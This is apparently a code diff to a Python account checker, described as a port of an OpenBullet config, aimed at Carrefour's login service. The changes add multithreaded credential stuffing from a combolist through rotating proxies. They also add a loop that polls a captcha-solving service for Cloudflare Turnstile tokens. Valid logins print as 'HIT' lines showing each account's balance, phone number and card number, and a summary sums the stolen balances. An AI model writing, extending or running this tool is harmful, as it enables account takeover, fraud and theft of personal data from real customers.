@@ -3,16 +3,16 @@
 Python port of the OpenBullet / Node flow for Carrefour IAM (PKCE, forwarder,
 ForgeRock authenticate, captcha solver, login JSON, OAuth code, tokens, API).
 
-En mode interactif (sans variables d’identifiants), le script demande :
-  - O/N pour utiliser un fichier de proxies (une URL `http://user:pass@host:port` par ligne)
-  - le chemin de la combolist (`user:password` ou `user;password` par ligne, `#` = commentaire)
+En mode interactif : nombre de threads, puis proxy O/N, combolist. Compteurs
+  SUCCESS / INVALID / erreurs, somme des soldes des hits, et une ligne par hit
+  avec le solde. Boucle getTaskResult : tant que la réponse contient « processing »,
+  la même requête est renvoyée jusqu’à obtention du jeton Turnstile.
 
 Variables d’environnement (alternative ou complément) :
   SOLVER_CLIENT_KEY    — clé API solverify (sinon demandée au lancement si vide)
-  POST_PROXY_URL       — proxy unique pour le forwarder (si pas de mode fichier)
+  POST_PROXY_URL       — proxy unique (mode non interactif avec CARREFOUR_USER/PASS)
   CARREFOUR_USER / CARREFOUR_PASS — un seul compte sans combolist
-
-Optional:
+  THREAD_COUNT         — mode non interactif : nombre de workers (défaut 1)
   LOCAL_FORWARDER_URL  — default http://127.0.0.1:5000
   OAUTH_AUTHORIZATION_BASIC — Base64 for Android token exchange
       (default matches the config snippet; override in production)
@@ -35,11 +35,13 @@ import os
 import random
 import re
 import secrets
+import threading
 import time
 import uuid
 import urllib.error
 import urllib.parse
 import urllib.request
+from concurrent.futures import ThreadPoolExecutor, as_completed
 from datetime import datetime, timezone
 from typing import Any
 
@@ -233,6 +235,62 @@ def solver_get_result(client_key: str, task_id: str) -> dict[str, Any]:
     if status != 200:
         raise RuntimeError(f"getTaskResult HTTP {status}: {raw[:500]!r}")
     return json.loads(raw.decode("utf-8", errors="replace"))
+
+
+def _response_is_solver_processing(result: dict[str, Any]) -> bool:
+    """True if the API still indicates a pending task (repeat getTaskResult)."""
+    status = result.get("status")
+    if isinstance(status, str) and status.lower() == "processing":
+        return True
+    blob = json.dumps(result, ensure_ascii=False).lower()
+    return "processing" in blob
+
+
+def _extract_turnstile_token_from_solver_result(result: dict[str, Any]) -> str | None:
+    if result.get("status") != "ready":
+        return None
+    tok = result.get("value")
+    if tok:
+        return str(tok)
+    sol = result.get("solution")
+    if isinstance(sol, dict):
+        t = sol.get("token") or sol.get("value")
+        if t:
+            return str(t)
+    return None
+
+
+def poll_solver_until_turnstile_token(
+    client_key: str,
+    task_id: str,
+    *,
+    poll_interval: float = 2.0,
+    max_seconds: float = 600.0,
+) -> str:
+    """
+    Call getTaskResult in a loop: while the body/status is still « processing »,
+    send the same request again until the Turnstile token is available.
+    """
+    deadline = time.monotonic() + max_seconds
+    while time.monotonic() < deadline:
+        result = solver_get_result(client_key, str(task_id))
+        err = result.get("errorId")
+        if err not in (None, 0, "0"):
+            raise RuntimeError(f"Solver getTaskResult errorId: {result}")
+
+        token = _extract_turnstile_token_from_solver_result(result)
+        if token:
+            return token
+
+        if _response_is_solver_processing(result):
+            time.sleep(poll_interval)
+            continue
+
+        time.sleep(poll_interval)
+
+    raise RuntimeError(
+        "Captcha solver: délai dépassé (getTaskResult toujours sans jeton / processing)."
+    )
 
 
 def _reverse_hex_triplet(s: str) -> str:
@@ -499,6 +557,139 @@ def _solver_key_interactive() -> str:
     return k
 
 
+def _prompt_thread_count() -> int:
+    while True:
+        raw = input("Nombre de threads (workers) : ").strip()
+        if not raw:
+            return 1
+        try:
+            n = int(raw)
+        except ValueError:
+            print("Entrez un entier >= 1.")
+            continue
+        if n < 1:
+            print("Minimum 1 thread.")
+            continue
+        if n > 512:
+            print("Maximum 512 (sécurité).")
+            continue
+        return n
+
+
+class RunStats:
+    """Compteurs thread-safe pour le mode combolist."""
+
+    __slots__ = ("_lock", "success", "invalid", "errors", "total_solde_hits")
+
+    def __init__(self) -> None:
+        self._lock = threading.Lock()
+        self.success = 0
+        self.invalid = 0
+        self.errors = 0
+        self.total_solde_hits = 0.0
+
+    def add_success(self, solde: Any) -> None:
+        with self._lock:
+            self.success += 1
+            if solde is None:
+                return
+            try:
+                self.total_solde_hits += float(solde)
+            except (TypeError, ValueError):
+                pass
+
+    def add_invalid(self) -> None:
+        with self._lock:
+            self.invalid += 1
+
+    def add_error(self) -> None:
+        with self._lock:
+            self.errors += 1
+
+    def snapshot(self) -> tuple[int, int, int, float]:
+        with self._lock:
+            return (
+                self.success,
+                self.invalid,
+                self.errors,
+                self.total_solde_hits,
+            )
+
+
+def _run_one_combo_job(
+    line_no: int,
+    user: str,
+    password: str,
+    post_proxy: str,
+    solver_client_key: str,
+    stats: RunStats,
+) -> None:
+    label = f"[{line_no}] {user}"
+    try:
+        out = run_full_flow(
+            post_proxy, user, password, solver_client_key=solver_client_key
+        )
+    except Exception as e:
+        stats.add_error()
+        print(f"{label} | ERROR | {e}", flush=True)
+        return
+
+    outcome = out.get("authenticate_outcome")
+    if outcome == "success":
+        stats.add_success(out.get("solde"))
+        solde = out.get("solde")
+        phone = out.get("phone") or ""
+        carte = out.get("carte") or ""
+        solde_s = f"{solde}" if solde is not None else "N/A"
+        print(
+            f"HIT | {label} | solde={solde_s} | phone={phone} | carte={carte}",
+            flush=True,
+        )
+    else:
+        stats.add_invalid()
+        print(f"{label} | INVALID | outcome={outcome}", flush=True)
+
+
+def _run_combo_pool(
+    proxy_list: list[str],
+    combos: list[tuple[str, str]],
+    solver_client_key: str,
+    num_threads: int,
+) -> None:
+    stats = RunStats()
+    n_proxy = len(proxy_list)
+    jobs: list[tuple[int, str, str, str]] = []
+    for i, (user, password) in enumerate(combos):
+        post_proxy = proxy_list[i % n_proxy]
+        jobs.append((i + 1, user, password, post_proxy))
+
+    with ThreadPoolExecutor(max_workers=num_threads) as ex:
+        futs = [
+            ex.submit(
+                _run_one_combo_job,
+                line_no,
+                user,
+                password,
+                post_proxy,
+                solver_client_key,
+                stats,
+            )
+            for line_no, user, password, post_proxy in jobs
+        ]
+        for fut in as_completed(futs):
+            fut.result()
+
+    s, inv, err, total_solde = stats.snapshot()
+    total_lines = len(combos)
+    print("\n========== RÉSUMÉ ==========", flush=True)
+    print(f"Total lignes   : {total_lines}", flush=True)
+    print(f"SUCCESS (hits) : {s}", flush=True)
+    print(f"INVALID        : {inv}", flush=True)
+    print(f"ERREURS        : {err}", flush=True)
+    print(f"Somme soldes   : {total_solde}", flush=True)
+    print("==============================", flush=True)
+
+
 def run_full_flow(
     post_proxy: str,
     user: str,
@@ -632,19 +823,7 @@ def run_full_flow(
     if not task_id:
         raise RuntimeError("Missing taskId from solver")
 
-    token44 = None
-    for _ in range(60):
-        result = solver_get_result(solver_client_key, str(task_id))
-        if result.get("status") == "ready":
-            token44 = result.get("value")
-            if not token44 and isinstance(result.get("solution"), dict):
-                sol = result["solution"]
-                token44 = sol.get("token") or sol.get("value")
-            if token44:
-                break
-        time.sleep(2)
-    if not token44:
-        raise RuntimeError("Captcha solver did not return a token in time.")
+    token44 = poll_solver_until_turnstile_token(solver_client_key, str(task_id))
 
     login_body = build_login_json_body(str(auth_id), user, password, str(token44))
     login_headers = {
@@ -857,6 +1036,11 @@ if __name__ == "__main__":
     env_user = os.environ.get("CARREFOUR_USER", "").strip()
     env_pass = os.environ.get("CARREFOUR_PASS", "").strip()
     env_proxy = os.environ.get("POST_PROXY_URL", "").strip()
+    thread_env = os.environ.get("THREAD_COUNT", "").strip()
+    try:
+        env_threads = max(1, int(thread_env)) if thread_env else 1
+    except ValueError:
+        env_threads = 1
 
     if env_user and env_pass and env_proxy:
         solver = _solver_key_interactive()
@@ -869,22 +1053,7 @@ if __name__ == "__main__":
         )
         raise SystemExit(1)
     else:
+        num_threads = _prompt_thread_count()
         solver = _solver_key_interactive()
         proxy_list, combos = _interactive_proxy_and_combolist()
-        results: list[dict[str, Any]] = []
-        for i, (user, password) in enumerate(combos):
-            post_proxy = proxy_list[i % len(proxy_list)]
-            label = f"[{i + 1}/{len(combos)}] {user!s}"
-            try:
-                out = run_full_flow(
-                    post_proxy, user, password, solver_client_key=solver
-                )
-                out["_line"] = i + 1
-                results.append(out)
-                print(label, "->", json.dumps(out, ensure_ascii=False)[:500])
-            except Exception as e:
-                err = {"_line": i + 1, "login_user": user, "error": str(e)}
-                results.append(err)
-                print(label, "-> ERREUR:", e)
-        print("\n--- Résumé ---")
-        print(json.dumps(results, indent=2, ensure_ascii=False))
+        _run_combo_pool(proxy_list, combos, solver, num_threads)
